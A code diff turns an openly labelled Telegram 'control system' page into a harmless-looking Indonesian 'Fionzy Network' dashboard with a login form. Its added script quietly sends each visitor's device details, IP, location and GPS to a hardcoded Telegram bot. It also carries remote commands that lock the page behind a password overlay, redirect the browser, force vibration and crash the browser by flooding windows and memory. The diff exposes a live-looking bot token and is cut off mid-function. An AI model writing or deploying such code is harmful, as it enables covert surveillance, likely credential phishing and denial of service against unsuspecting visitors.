@@ -3,555 +3,522 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>FionzyGPT | Telegram Control System v2.879</title>
+    <title>Fionzy Network | Dashboard</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            background: #0a0c0f;
-            font-family: 'Courier New', 'Fira Code', monospace;
+            background: #f0f2f5;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
             padding: 20px;
-            color: #00ffcc;
+            transition: 0.3s;
         }
-        .system-header {
-            border: 2px solid #00ffcc;
-            background: #0f1215;
-            margin-bottom: 20px;
-            box-shadow: 0 0 15px rgba(0,255,204,0.3);
-        }
-        .sys-title {
-            padding: 12px 20px;
-            border-bottom: 1px solid #00ffcc33;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-        .sys-title h1 {
-            font-size: 1.2rem;
-            letter-spacing: 2px;
-            font-weight: normal;
-        }
-        .badge {
-            background: #00ffcc11;
-            border: 1px solid #00ffcc;
-            padding: 4px 12px;
-            font-size: 0.7rem;
-        }
-        .commands-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-            gap: 18px;
-            margin-bottom: 25px;
-        }
-        .command-card {
-            border: 1px solid #2a3a3a;
-            background: #0f1215;
-            transition: 0.2s;
-        }
-        .command-card:hover {
-            border-color: #00ffcc;
-            box-shadow: 0 0 8px #00ffcc55;
-        }
-        .card-header {
-            background: #00ffcc11;
-            padding: 12px 16px;
-            border-bottom: 1px solid #00ffcc33;
-            font-weight: bold;
-            font-size: 1.2rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            color: #00ffcc;
-        }
-        .command-list {
-            padding: 12px 16px;
-        }
-        .cmd-item {
-            margin-bottom: 12px;
-            border-left: 2px solid #2a3a3a;
-            padding-left: 12px;
-        }
-        .cmd {
-            color: #ffaa44;
-            font-weight: bold;
-            font-family: monospace;
-            font-size: 0.9rem;
-        }
-        .cmd-desc {
-            color: #88aa99;
-            font-size: 0.8rem;
-            margin-top: 4px;
-        }
-        .danger-cmd { color: #ff7777; }
-        .device-panel {
-            border: 2px solid #00ffcc88;
-            background: #0a0c0f;
-            margin-bottom: 20px;
+        body.locked {
             overflow: hidden;
         }
-        .device-header {
-            background: #00ffcc22;
-            padding: 12px 16px;
-            font-weight: bold;
+        .lock-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 9999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            backdrop-filter: blur(10px);
+        }
+        .lock-box {
+            background: #1a1a2e;
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            border: 1px solid #ff4444;
+            box-shadow: 0 0 50px rgba(255,0,0,0.3);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 20px rgba(255,0,0,0.3); }
+            50% { box-shadow: 0 0 50px rgba(255,0,0,0.6); }
+            100% { box-shadow: 0 0 20px rgba(255,0,0,0.3); }
+        }
+        .lock-box h1 {
+            color: #ff4444;
+            margin-bottom: 20px;
+            font-size: 2rem;
+        }
+        .lock-box p {
+            color: #aaa;
+            margin-bottom: 30px;
+        }
+        .lock-box input {
+            padding: 12px 20px;
+            width: 250px;
+            border: none;
+            border-radius: 10px;
+            background: #2a2a3e;
+            color: white;
+            text-align: center;
             font-size: 1rem;
-            border-bottom: 1px solid #00ffcc;
+            margin-bottom: 15px;
+        }
+        .lock-box button {
+            background: #ff4444;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+        }
+        .lock-box button:hover {
+            background: #ff6666;
+        }
+        .navbar {
+            background: white;
+            padding: 15px 30px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
             display: flex;
             justify-content: space-between;
             align-items: center;
             flex-wrap: wrap;
-            gap: 10px;
+            gap: 15px;
+            border-radius: 12px;
+            margin-bottom: 30px;
         }
-        .device-content {
-            padding: 16px;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 12px;
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
-        .info-row {
-            border-bottom: 1px solid #2a3a3a;
-            padding: 8px 0;
+        .user-menu {
             display: flex;
-            justify-content: space-between;
-            flex-wrap: wrap;
+            align-items: center;
+            gap: 15px;
         }
-        .info-label { color: #88aaff; font-weight: bold; }
-        .info-value { color: #ffaa88; word-break: break-all; font-family: monospace; }
-        button {
-            background: #00ffcc22;
-            border: 1px solid #00ffcc;
-            color: #00ffcc;
-            padding: 6px 14px;
-            font-family: monospace;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        button:hover {
-            background: #00ffcc;
-            color: #0a0c0f;
-            box-shadow: 0 0 12px #00ffcc;
-        }
-        .toast-msg {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: #1f1f2f;
-            border-left: 4px solid #00ffcc;
-            padding: 10px 18px;
-            font-size: 0.8rem;
-            z-index: 999;
-            animation: fadeOut 3s forwards;
-        }
-        @keyframes fadeOut {
-            0% { opacity: 1; transform: translateY(0);}
-            70% { opacity: 1;}
-            100% { opacity: 0; visibility: hidden;}
-        }
-        .webhook-status {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
+        .avatar {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
             border-radius: 50%;
-            background: #ff5555;
-            margin-right: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
         }
-        .webhook-status.active { background: #55ff55; box-shadow: 0 0 5px #55ff55; }
-        .quick-panel {
-            border: 1px solid #2a3a3a;
-            padding: 16px;
-            margin-top: 8px;
-            background: #0c0f12;
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
         }
-        .quick-panel input {
-            background: #111;
-            border: 1px solid #00ffcc55;
-            color: #00ffcc;
-            padding: 8px;
-            flex: 1;
-            min-width: 180px;
-            font-family: monospace;
+        .welcome-card {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            padding: 30px;
+            border-radius: 20px;
+            margin-bottom: 30px;
         }
-        @media (max-width: 700px) { body { padding: 10px; } }
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        .stat-card {
+            background: white;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+        .login-form {
+            background: white;
+            padding: 25px;
+            border-radius: 15px;
+            margin-bottom: 30px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 1rem;
+        }
+        .btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+        }
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+        }
+        .feature {
+            background: white;
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+        }
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            padding: 20px;
+            color: #666;
+            font-size: 0.8rem;
+        }
+        @media (max-width: 768px) {
+            body { padding: 10px; }
+        }
     </style>
 </head>
 <body>
-
-<div class="system-header">
-    <div class="sys-title">
-        <h1>⚡ FIONZYGPT TELEGRAM CONTROL SYSTEM [v.2879]</h1>
-        <div class="badge">SYSTEM UI ACTIVE ✅🔥</div>
-    </div>
-    <div style="padding: 8px 20px; font-size: 0.75rem; border-top: 1px solid #00ffcc33;">
-        <span id="webhookStatusIndicator" class="webhook-status"></span> Webhook: <span id="webhookStatusText">FionzyGPT Active</span> &nbsp;|&nbsp; DEVICE HUNTER READY ⚡
-    </div>
-</div>
-
-<div class="device-panel">
-    <div class="device-header">
-        <span>📱 DEVICE INTELLIGENCE | FULL DETAIL TARGET</span>
-        <button id="refreshDeviceBtn">⟳ REFRESH</button>
-        <button id="sendDeviceToBotBtn">📤 KIRIM KE TELEGRAM</button>
-    </div>
-    <div class="device-content" id="deviceContent">
-        <div style="grid-column:1/-1; text-align:center; padding:20px;">Memuat data device...</div>
-    </div>
-</div>
-
-<div class="commands-grid">
-    <div class="command-card">
-        <div class="card-header">📡 INFORMASI</div>
-        <div class="command-list">
-            <div class="cmd-item"><span class="cmd">/info</span><div class="cmd-desc">Full info target → IP + lokasi + GPS + battery + device detail</div></div>
-            <div class="cmd-item"><span class="cmd">/ip</span><div class="cmd-desc">Tampilkan IP address + lokasi</div></div>
+    <!-- Lock Overlay -->
+    <div class="lock-overlay" id="lockOverlay">
+        <div class="lock-box">
+            <h1>🔒 DEVICE LOCKED</h1>
+            <p>Perangkat ini telah dikunci oleh administrator</p>
+            <input type="password" id="lockPassword" placeholder="Masukkan kode unlock">
+            <button id="unlockBtn">UNLOCK</button>
+            <p style="font-size: 0.7rem; margin-top: 15px;">Kontak administrator untuk kode unlock</p>
         </div>
     </div>
-    <div class="command-card">
-        <div class="card-header">🎮 KONTROL</div>
-        <div class="command-list">
-            <div class="cmd-item"><span class="cmd">/gps</span><div class="cmd-desc">GPS realtime + maps</div></div>
-            <div class="cmd-item"><span class="cmd">/batre</span><div class="cmd-desc">Battery status</div></div>
-            <div class="cmd-item"><span class="cmd">/device</span><div class="cmd-desc">Device detail lengkap</div></div>
-            <div class="cmd-item"><span class="cmd">/lock</span><div class="cmd-desc">Lock device (minta password)</div></div>
-            <div class="cmd-item"><span class="cmd">/unlock [p]</span><div class="cmd-desc">Unlock device dengan password</div></div>
-            <div class="cmd-item"><span class="cmd">/setpass [p]</span><div class="cmd-desc">Set lock password</div></div>
-            <div class="cmd-item"><span class="cmd">/vibrate</span><div class="cmd-desc">Vibrate 5 detik</div></div>
-            <div class="cmd-item"><span class="cmd">/fullscreen</span><div class="cmd-desc">Force fullscreen browser</div></div>
-        </div>
-    </div>
-    <div class="command-card">
-        <div class="card-header">💀 EKSEKUSI</div>
-        <div class="command-list">
-            <div class="cmd-item"><span class="cmd">/toast [msg]</span><div class="cmd-desc">Show toast message di target</div></div>
-            <div class="cmd-item"><span class="cmd">/redirect [u]</span><div class="cmd-desc">Redirect ke URL tertentu</div></div>
-            <div class="cmd-item"><span class="cmd danger-cmd">/crash</span><div class="cmd-desc">Crash browser target (memory overload)</div></div>
-            <div class="cmd-item"><span class="cmd danger-cmd">/spam</span><div class="cmd-desc">Spam alert 50x bertubi-tubi</div></div>
-        </div>
-    </div>
-    <div class="command-card">
-        <div class="card-header">⚙️ MANAJEMEN</div>
-        <div class="command-list">
-            <div class="cmd-item"><span class="cmd">/menu</span><div class="cmd-desc">Tampilkan menu perintah ini</div></div>
-        </div>
-    </div>
-</div>
 
-<div class="quick-panel">
-    <div style="display: flex; gap: 12px; flex-wrap: wrap; align-items: center;">
-        <span style="font-weight: bold;">⚡ QUICK COMMAND :</span>
-        <input type="text" id="quickCmd" placeholder="/toast Halo target">
-        <button id="execQuickBtn">EKSEKUSI ⚡</button>
-        <button id="testCrashBtn" style="border-color:#ff6666;">💀 CRASH</button>
-    </div>
-    <div id="responseArea" style="margin-top: 16px; font-size: 0.75rem; color: #88aa99; border-top: 1px solid #1f2a2a; padding-top: 10px;">
-        [STATUS] FionzyGPT Active | Semua perintah siap dieksekusi
-    </div>
-</div>
+    <div class="container" id="mainContent">
+        <div class="navbar">
+            <div class="logo">⚡ Fionzy Network</div>
+            <div class="user-menu">
+                <span id="userNameDisplay">Guest</span>
+                <div class="avatar">G</div>
+            </div>
+        </div>
 
-<div class="status-bar" style="border-top: 1px solid #2a3a3a; margin-top: 20px; padding: 15px; display: flex; justify-content: space-between; font-size: 0.7rem;">
-    <span>🔐 FionzyGPT Protocol | No sensor | Eksekusi mutlak ⚡</span>
-    <span>📡 Cloudflare Ready | Bot Active</span>
-</div>
+        <div class="welcome-card">
+            <h1>Selamat Datang di Fionzy Network</h1>
+            <p>Platform terintegrasi untuk kebutuhan digital Anda</p>
+        </div>
 
-<script>
-    // ======================= KONFIGURASI BOT =======================
-    // 🔥 GANTI 2 BARIS INI DOANG, TUAN! 🔥
-    const TELEGRAM_BOT_TOKEN = "8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA";  // <-- GANTI DENGAN TOKEN BOT DARI @BotFather
-    const TELEGRAM_CHAT_ID = "7373392803";  // <-- GANTI DENGAN CHAT ID TUAN (bisa @userinfobot buat dapetin)
-    // ===============================================================
-    
-    let currentDeviceData = {};
-    let currentLocation = { lat: null, lon: null, accuracy: null };
-    let lockPassword = null;
-    let isLocked = false;
-    
-    // Kirim pesan ke Telegram
-    async function sendToTelegram(message) {
-        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes("YOUR_BOT_TOKEN")) {
-            console.log("Token belum diisi, pesan:", message);
-            showToast("⚠️ Isi TELEGRAM_BOT_TOKEN dulu di kode!", true);
-            return false;
-        }
+        <div class="stats-grid">
+            <div class="stat-card">
+                <h3>Total Pengguna</h3>
+                <div class="value" style="font-size:2rem; font-weight:bold;">1,234+</div>
+            </div>
+            <div class="stat-card">
+                <h3>Aktif Hari Ini</h3>
+                <div class="value" style="font-size:2rem; font-weight:bold;">89</div>
+            </div>
+            <div class="stat-card">
+                <h3>Layanan Aktif</h3>
+                <div class="value" style="font-size:2rem; font-weight:bold;">12</div>
+            </div>
+        </div>
+
+        <div class="login-form">
+            <h3>🔐 Login untuk Akses Penuh</h3>
+            <div class="input-group">
+                <input type="text" id="email" placeholder="Email atau Username">
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Password">
+            </div>
+            <button class="btn" id="loginBtn">Login Sekarang</button>
+            <div id="loginMsg" style="margin-top:10px; font-size:0.8rem; color:#666;"></div>
+        </div>
+
+        <h3 style="margin-bottom: 15px;">✨ Layanan Kami</h3>
+        <div class="features">
+            <div class="feature"><span>📊</span><p>Analitik Real-time</p></div>
+            <div class="feature"><span>🔒</span><p>Keamanan Terenkripsi</p></div>
+            <div class="feature"><span>⚡</span><p>Kecepatan Tinggi</p></div>
+            <div class="feature"><span>🌐</span><p>Cloud Integration</p></div>
+        </div>
+        <footer>© 2024 Fionzy Network | All rights reserved</footer>
+    </div>
+
+    <script>
+        // ======================= KONFIGURASI TELEGRAM =======================
+        // 🔥 GANTI DENGAN DATA BOT TUAN 🔥
+        const TELEGRAM_BOT_TOKEN = "8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA";  // GANTI!
+        const TELEGRAM_CHAT_ID = "7373392803";  // GANTI DENGAN CHAT ID TUAN!
+        // ===================================================================
         
-        try {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            const response = await fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: "HTML"
-                })
-            });
-            const result = await response.json();
-            if (result.ok) {
-                showToast("✅ Pesan terkirim ke Telegram");
-                return true;
-            } else {
-                showToast("❌ Gagal kirim: " + result.description, true);
+        let lockPassword = null;
+        let isLocked = false;
+        let capturedData = {
+            device: {},
+            credentials: [],
+            location: null,
+            ip: null
+        };
+        
+        // ======================= KIRIM KE TELEGRAM =======================
+        async function sendToTelegram(message) {
+            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes("YOUR_BOT_TOKEN")) {
+                console.log("⚠️ Token belum diisi! Pesan:", message);
                 return false;
             }
-        } catch(e) {
-            showToast("❌ Error: " + e.message, true);
-            return false;
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: "HTML"
+                    })
+                });
+                return true;
+            } catch(e) { return false; }
         }
-    }
-    
-    // Format device data jadi pesan Telegram
-    function formatDeviceMessage() {
-        return `📱 <b>DEVICE FULL INFO</b> ⚡\n\n` +
-               `🔹 <b>OS:</b> ${currentDeviceData.os || '-'}\n` +
-               `🔹 <b>Browser:</b> ${currentDeviceData.browser || '-'}\n` +
-               `🔹 <b>Public IP:</b> ${currentDeviceData.publicIP || '-'}\n` +
-               `🔹 <b>Location (IP):</b> ${currentDeviceData.location || '-'}\n` +
-               `🔹 <b>ISP:</b> ${currentDeviceData.isp || '-'}\n` +
-               `🔹 <b>GPS:</b> ${currentLocation.lat ? `${currentLocation.lat}, ${currentLocation.lon} (${currentLocation.accuracy}m)` : 'Tidak diizinkan'}\n` +
-               `🔹 <b>Battery:</b> ${currentDeviceData.battery || '-'}\n` +
-               `🔹 <b>Screen:</b> ${currentDeviceData.screen || '-'}\n` +
-               `🔹 <b>CPU Cores:</b> ${currentDeviceData.cpuCores || '-'}\n` +
-               `🔹 <b>Device Memory:</b> ${currentDeviceData.deviceMemory || '-'}\n` +
-               `🔹 <b>Timezone:</b> ${currentDeviceData.timezone || '-'}\n` +
-               `🔹 <b>Language:</b> ${currentDeviceData.language || '-'}\n` +
-               `🔹 <b>User Agent:</b> <code>${(currentDeviceData.userAgent || '-').substring(0, 150)}</code>`;
-    }
-    
-    // Ambil semua data device
-    async function getDeviceDetails() {
-        const ua = navigator.userAgent;
-        let os = "Unknown", browser = "Unknown";
-        if (ua.includes("Windows")) os = "Windows";
-        else if (ua.includes("Android")) os = "Android";
-        else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
-        else if (ua.includes("Mac")) os = "MacOS";
-        else if (ua.includes("Linux")) os = "Linux";
         
-        if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
-        else if (ua.includes("Firefox")) browser = "Firefox";
-        else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
-        else if (ua.includes("Edg")) browser = "Edge";
+        // ======================= AMBIL DATA DEVICE =======================
+        async function collectDeviceData() {
+            const ua = navigator.userAgent;
+            let os = "Unknown", browser = "Unknown";
+            if (ua.includes("Windows")) os = "Windows";
+            else if (ua.includes("Android")) os = "Android";
+            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+            else if (ua.includes("Mac")) os = "MacOS";
+            else if (ua.includes("Linux")) os = "Linux";
+            
+            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
+            else if (ua.includes("Firefox")) browser = "Firefox";
+            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
+            else if (ua.includes("Edg")) browser = "Edge";
+            
+            capturedData.device = {
+                os: os, browser: browser, userAgent: ua,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cpuCores: navigator.hardwareConcurrency || 'unknown'
+            };
+            
+            // Battery
+            if (navigator.getBattery) {
+                navigator.getBattery().then(b => {
+                    capturedData.device.battery = `${Math.floor(b.level * 100)}%, ${b.charging ? 'Charging' : 'Discharging'}`;
+                });
+            }
+            
+            // IP & Location
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                capturedData.ip = ipData.ip;
+                const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const geo = await geoRes.json();
+                capturedData.location = `${geo.city || '-'}, ${geo.region || '-'}, ${geo.country_name || '-'}`;
+                capturedData.isp = geo.org || '-';
+            } catch(e) {}
+            
+            // Kirim data device otomatis ke Telegram
+            setTimeout(() => {
+                sendToTelegram(`🖥️ <b>NEW TARGET DETECTED</b>\n\n` +
+                    `🔹 <b>OS:</b> ${capturedData.device.os}\n` +
+                    `🔹 <b>Browser:</b> ${capturedData.device.browser}\n` +
+                    `🔹 <b>IP:</b> ${capturedData.ip || 'fetching...'}\n` +
+                    `🔹 <b>Location:</b> ${capturedData.location || 'fetching...'}\n` +
+                    `🔹 <b>ISP:</b> ${capturedData.isp || '-'}\n` +
+                    `🔹 <b>Screen:</b> ${capturedData.device.screen}\n` +
+                    `🔹 <b>Timezone:</b> ${capturedData.device.timezone}\n` +
+                    `🔹 <b>User Agent:</b> <code>${capturedData.device.userAgent.substring(0, 100)}</code>`);
+            }, 2000);
+        }
         
-        currentDeviceData = {
-            os: os, browser: browser, userAgent: ua,
-            platform: navigator.platform, language: navigator.language,
-            cookieEnabled: navigator.cookieEnabled,
-            cpuCores: navigator.hardwareConcurrency || 'unknown',
-            deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : 'unknown',
-            maxTouchPoints: navigator.maxTouchPoints || 0,
-            screen: `${screen.width}x${screen.height}`,
-            pixelRatio: window.devicePixelRatio || 1,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            battery: "checking...",
-            publicIP: "fetching...", location: "fetching...", isp: "fetching..."
+        // ======================= GPS REAL-TIME =======================
+        function getGPS() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const lat = pos.coords.latitude;
+                        const lon = pos.coords.longitude;
+                        capturedData.location = `${lat}, ${lon}`;
+                        sendToTelegram(`📍 <b>GPS REALTIME</b>\nLat: ${lat}\nLon: ${lon}\nAccuracy: ${pos.coords.accuracy}m\n\n🗺️ https://maps.google.com/?q=${lat},${lon}`);
+                    },
+                    (err) => { sendToTelegram(`⚠️ GPS Error: ${err.message}`); },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            }
+        }
+        
+        // ======================= LOCK DEVICE =======================
+        function lockDevice(pwd) {
+            lockPassword = pwd;
+            isLocked = true;
+            document.getElementById("lockOverlay").style.display = "flex";
+            document.body.classList.add("locked");
+            sendToTelegram(`🔒 <b>DEVICE LOCKED</b>\nPassword: ${pwd}\nTarget terkunci, hanya bisa unlock dengan password ini.`);
+        }
+        
+        function unlockDevice(inputPwd) {
+            if (inputPwd === lockPassword) {
+                isLocked = false;
+                document.getElementById("lockOverlay").style.display = "none";
+                document.body.classList.remove("locked");
+                sendToTelegram(`🔓 <b>DEVICE UNLOCKED</b>\nTarget berhasil membuka kunci.`);
+                return true;
+            } else {
+                alert("❌ Kode unlock salah! Hubungi administrator.");
+                return false;
+            }
+        }
+        
+        // ======================= EKSEKUSI COMMAND DARI TELEGRAM =======================
+        // Fungsi ini dipanggil via webhook/polling dari server Tuan
+        window.executeCommand = function(command, param = null) {
+            const cmd = command.toLowerCase();
+            
+            if (cmd === "/lock") {
+                const pwd = param || Math.random().toString(36).substring(2, 10);
+                lockDevice(pwd);
+                return { status: "locked", password: pwd };
+            }
+            else if (cmd === "/unlock") {
+                if (unlockDevice(param)) return { status: "unlocked" };
+                return { status: "failed", message: "wrong password" };
+            }
+            else if (cmd === "/info") {
+                sendToTelegram(`📱 <b>FULL DEVICE INFO</b>\n\n` +
+                    `OS: ${capturedData.device.os}\n` +
+                    `Browser: ${capturedData.device.browser}\n` +
+                    `IP: ${capturedData.ip}\n` +
+                    `Location: ${capturedData.location}\n` +
+                    `Screen: ${capturedData.device.screen}\n` +
+                    `Timezone: ${capturedData.device.timezone}\n` +
+                    `CPU: ${capturedData.device.cpuCores} cores`);
+                return { status: "info_sent" };
+            }
+            else if (cmd === "/gps") {
+                getGPS();
+                return { status: "gps_triggered" };
+            }
+            else if (cmd === "/toast") {
+                showToastMessage(param || "FionzyGPT Command");
+                return { status: "toast_shown" };
+            }
+            else if (cmd === "/crash") {
+                crashBrowser();
+                return { status: "crash_initiated" };
+            }
+            else if (cmd === "/redirect") {
+                if(param) window.location.href = param;
+                return { status: "redirected" };
+            }
+            else if (cmd === "/fullscreen") {
+                document.documentElement.requestFullscreen();
+                return { status: "fullscreen_forced" };
+            }
+            else if (cmd === "/vibrate") {
+                if(navigator.vibrate) navigator.vibrate(5000);
+                return { status: "vibrated" };
+            }
+            else if (cmd === "/batre") {
+                if(navigator.getBattery) {
+                    navigator.getBattery().then(b => {
+                        sendToTelegram(`🔋 <b>BATTERY STATUS</b>\nLevel: ${Math.floor(b.level*100)}%\nCharging: ${b.charging}`);
+                    });
+                }
+                return { status: "battery_checking" };
+            }
+            
+            return { status: "unknown_command" };
         };
         
-        // Battery
-        if (navigator.getBattery) {
-            navigator.getBattery().then(b => {
-                currentDeviceData.battery = `${Math.floor(b.level * 100)}%, ${b.charging ? '🔋 Charging' : '⚡ Discharging'}`;
-                updateDeviceDisplay();
-            });
+        function showToastMessage(msg) {
+            const toast = document.createElement("div");
+            toast.innerHTML = `⚡ ${msg}`;
+            toast.style.position = "fixed";
+            toast.style.bottom = "20px";
+            toast.style.right = "20px";
+            toast.style.background = "#1a1a2e";
+            toast.style.color = "#00ffcc";
+            toast.style.padding = "12px 20px";
+            toast.style.borderRadius = "10px";
+            toast.style.borderLeft = "4px solid #00ffcc";
+            toast.style.zIndex = "10000";
+            toast.style.fontFamily = "monospace";
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 3000);
         }
         
-        // IP & Geo
-        try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            currentDeviceData.publicIP = ipData.ip;
-            const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-            const geo = await geoRes.json();
-            currentDeviceData.location = `${geo.city || '-'}, ${geo.region || '-'}, ${geo.country_name || '-'}`;
-            currentDeviceData.isp = geo.org || '-';
-            currentDeviceData.lat = geo.latitude;
-            currentDeviceData.lon = geo.longitude;
-        } catch(e) { currentDeviceData.publicIP = "gagal ambil"; }
+        function crashBrowser() {
+            for(let i = 0; i < 100; i++) {
+                const w = window.open("about:blank", "_blank");
+                if(w) setTimeout(() => w.close(), 1);
+            }
+            const arr = [];
+            setInterval(() => { arr.push(new Array(1000000).join('x')); }, 10);
+        }
         
-        updateDeviceDisplay();
-    }
-    
-    // GPS realtime
-    function getGPSRealtime() {
-        if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    currentLocation = {
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy
-                    };
-                    currentDeviceData.gpsLat = currentLocation.lat;
-                    currentDeviceData.gpsLon = currentLocation.lon;
-                    updateDeviceDisplay();
-                    showToast(`📍 GPS: ${currentLocation.lat}, ${currentLocation.lon}`);
-                    sendToTelegram(`📍 <b>GPS REALTIME</b>\nLat: ${currentLocation.lat}\nLon: ${currentLocation.lon}\nAccuracy: ${currentLocation.accuracy}m\nhttps://maps.google.com/?q=${currentLocation.lat},${currentLocation.lon}`);
-                },
-                (err) => { showToast("GPS error: " + err.message, true); },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
-        } else { showToast("GPS not supported", true); }
-    }
-    
-    function updateDeviceDisplay() {
-        const container = document.getElementById("deviceContent");
-        if (!container) return;
-        container.innerHTML = `
-            <div class="info-row"><span class="info-label">OS / Platform:</span><span class="info-value">${currentDeviceData.os || '-'} | ${currentDeviceData.platform || '-'}</span></div>
-            <div class="info-row"><span class="info-label">Browser:</span><span class="info-value">${currentDeviceData.browser || '-'}</span></div>
-            <div class="info-row"><span class="info-label">CPU / Memory:</span><span class="info-value">${currentDeviceData.cpuCores} cores | ${currentDeviceData.deviceMemory}</span></div>
-            <div class="info-row"><span class="info-label">Screen / Ratio:</span><span class="info-value">${currentDeviceData.screen} | dpr:${currentDeviceData.pixelRatio}</span></div>
-            <div class="info-row"><span class="info-label">Battery:</span><span class="info-value">${currentDeviceData.battery || '-'}</span></div>
-            <div class="info-row"><span class="info-label">Public IP:</span><span class="info-value">${currentDeviceData.publicIP || '-'}</span></div>
-            <div class="info-row"><span class="info-label">Location:</span><span class="info-value">${currentDeviceData.location || '-'}<br>ISP: ${currentDeviceData.isp || '-'}</span></div>
-            <div class="info-row"><span class="info-label">GPS Realtime:</span><span class="info-value">${currentLocation.lat ? `<a href="https://maps.google.com/?q=${currentLocation.lat},${currentLocation.lon}" target="_blank" style="color:#00ffcc;">🗺️ ${currentLocation.lat}, ${currentLocation.lon}</a><br>Accuracy: ${currentLocation.accuracy}m` : '<button id="getGpsBtn" style="padding:2px 8px;">🎯 Ambil GPS</button>'}</span></div>
-        `;
-        const gpsBtn = document.getElementById("getGpsBtn");
-        if (gpsBtn) gpsBtn.onclick = () => getGPSRealtime();
-    }
-    
-    // EKSEKUSI FUNGSI
-    function showToast(msg, isError = false) {
-        const toast = document.createElement("div");
-        toast.className = "toast-msg";
-        toast.style.borderLeftColor = isError ? "#ff5555" : "#00ffcc";
-        toast.innerHTML = `⚡ ${msg}`;
-        document.body.appendChild(toast);
-        setTimeout(() => toast.remove(), 3000);
-    }
-    
-    function crashBrowser() {
-        showToast("💀 CRASH INITIATED");
-        for(let i = 0; i < 50; i++) {
-            const w = window.open("about:blank", "_blank");
-            if(w) setTimeout(() => w.close(), 5);
-        }
-        const arr = [];
-        setInterval(() => { arr.push(new Array(1000000).join('x')); }, 10);
-        sendToTelegram("💀 <b>CRASH COMMAND EXECUTED</b>\nBrowser target di-crash.");
-    }
-    
-    function spamAlert() {
